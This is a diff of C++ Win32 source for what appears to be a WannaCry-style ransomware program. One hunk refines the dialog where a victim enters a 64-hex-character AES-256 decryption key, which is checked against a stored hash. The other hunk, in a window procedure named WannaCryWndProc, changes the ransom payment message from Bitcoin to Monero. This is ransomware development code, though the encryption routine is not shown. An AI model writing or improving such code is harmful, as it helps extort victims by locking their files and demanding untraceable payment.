@@ -371,47 +371,39 @@ LRESULT CALLBACK KeyDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam
 
                 int len = GetWindowTextLengthW(hEdit);
                 if (len < 64) {
-                    MessageBoxW(hwnd, L"Key has to be 64 hex characters long (without spaces).", L"Error", MB_OK | MB_ICONERROR);
+                    MessageBoxW(hwnd, L"Key is too short.", L"Error", MB_OK | MB_ICONERROR);
                     break;
                 }
 
-                std::wstring keyHexRaw(64, L'\0');
+                std::wstring keyHexRaw(len + 1, L'\0');
                 GetWindowTextW(hEdit, &keyHexRaw[0], len + 1);
+                keyHexRaw.resize(len);
 
                 std::wstring keyHex = StripWhitespace(keyHexRaw);
-
                 if (keyHex.length() != 64) {
-                    MessageBoxW(hwnd, L"Key has to be 64 hex characters long (without spaces).", L"Error", MB_OK | MB_ICONERROR);
+                    MessageBoxW(hwnd, L"Key has to be 64 hex characters after stripping whitespaces.", L"Error", MB_OK | MB_ICONERROR);
                     break;
                 }
 
-                std::string hexStr;
+                SecureBuffer tempKey(AES_256_KEY_SIZE);
                 try {
-                    hexStr = WStringToString(keyHex);
+                    tempKey = MasterKeyFromHexWString(keyHex);
                 } catch (...) {
-                    MessageBoxW(hwnd, L"Incorrect character (only ASCII).", L"Error", MB_OK | MB_ICONERROR);
+                    MessageBoxW(hwnd, L"Invalid hex characters in the string.", L"Error", MB_OK | MB_ICONERROR);
                     break;
                 }
 
-
-                    SecureBuffer tempKey(AES_256_KEY_SIZE);
-                    try {
-                        tempKey = MasterKeyFromHexWString(keyHex);
-                    } catch (...) {
-                        MessageBoxW(hwnd, L"Invalid hex format", L"Error", MB_OK | MB_ICONERROR);
-                        break;
-                    }
-
-                    if (!CheckKeyValidityFromBuffer(tempKey, *pData->hashPath)) {
-                        MessageBoxW(hwnd, L"Entered key is invalid", L"Error", MB_OK | MB_ICONERROR);
-                        break;
-                    }
-
-                    *pData->masterKey = std::move(tempKey);
-                    pData->success = true;
-                    DestroyWindow(hwnd);
+                
+                if (!CheckKeyValidityFromBuffer(tempKey, *pData->hashPath)) {
+                    MessageBoxW(hwnd, L"Entered key is invalid.", L"Error", MB_OK | MB_ICONERROR);
                     break;
                 }
+
+                *pData->masterKey = std::move(tempKey);
+                pData->success = true;
+                DestroyWindow(hwnd);
+                break;
+            }
             if (LOWORD(wParam) == IDCANCEL) {
                 if (pData) pData->success = false;
                 DestroyWindow(hwnd);
@@ -572,7 +564,7 @@ LRESULT CALLBACK WannaCryWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPar
         case WM_COMMAND: {
             switch (LOWORD(wParam)) {
                 case IDC_BTN_PAYMENT:
-                    MessageBoxW(hwnd, L"Payment is accepted in Bitcoin only.", L"Payment Info", MB_OK);
+                    MessageBoxW(hwnd, L"Payment is accepted in Monero (XMR) only.", L"Payment Info", MB_OK);
                     break;
 
                 case IDC_BTN_DECRYPT: {
